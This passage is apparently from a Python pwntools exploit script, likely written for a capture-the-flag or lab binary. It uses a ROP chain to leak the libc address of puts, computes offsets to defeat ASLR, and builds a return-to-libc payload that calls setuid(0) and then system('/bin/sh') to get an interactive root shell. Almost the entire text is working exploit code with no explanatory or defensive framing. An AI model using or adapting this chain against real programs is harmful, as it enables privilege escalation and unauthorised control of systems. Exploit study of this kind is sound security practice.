# Sending payload
payload = junk + str(rop)
p.sendline(payload)
garbage = p.recvuntil("access denied.") # Stops right before leak

# Cutting puts out of the output
leaked_puts = p.recv(7).strip().ljust(8, '\x00')
leaked_puts = u64(leaked_puts)
log.info("puts address is: {}".format(hex(leaked_puts)))

# Stage 2 - ignore
libc.address = leaked_puts - libc.symbols['puts'] # Finding offset
log.info("offset is: {}".format(hex(libc.address)))


# Trying to automate ------------------

# # Finding setuid
# suid_addr = ROP(libc)
# suid_addr.system(next(libc.search('setuid')))
# log.info("setuid address is: {}".format(suid_addr))

# # Finding binsh
# bin_sh = ROP(libc)
# bin_sh.search(regs=['rdi'], order = 'regs') # Finds gadget
# bin_sh.system(next(libc.search('/bin/sh\x00')))
# log.info("bin_sh address is: {}".format(bin_sh))

# # Finding sys
# libc_sys = ROP(libc)
# libc_sys.system(next(libc.search('system')))
# log.info("libc_system address is: {}".format(libc_sys))

# Trying to automate ------------------


# Hard coded address - Use 'readelf -s libc_file | grep name', to find addresses
libc_put = 0x809c0
libc_sys = 0x4f440
libc_sh = 0x1b3e9a
libc_suid = 0xe5970

pop_rdi = p64(0x40179b) # ROP gadget
zero_addr = p64(0) # for setting id to root
offset = leaked_puts - libc_put # finding offset, so we can clal the correct addresses (due to aslr)
sys_addr = p64(offset + libc_sys) # system address
sh_addr = p64(offset + libc_sh) # shell
suid_addr = p64(offset + libc_suid) # adding root perms

payload = junk + pop_rdi + zero_addr + suid_addr  + pop_rdi + sh_addr + sys_addr

p.sendline(payload)
p.recv()
p.interactive()

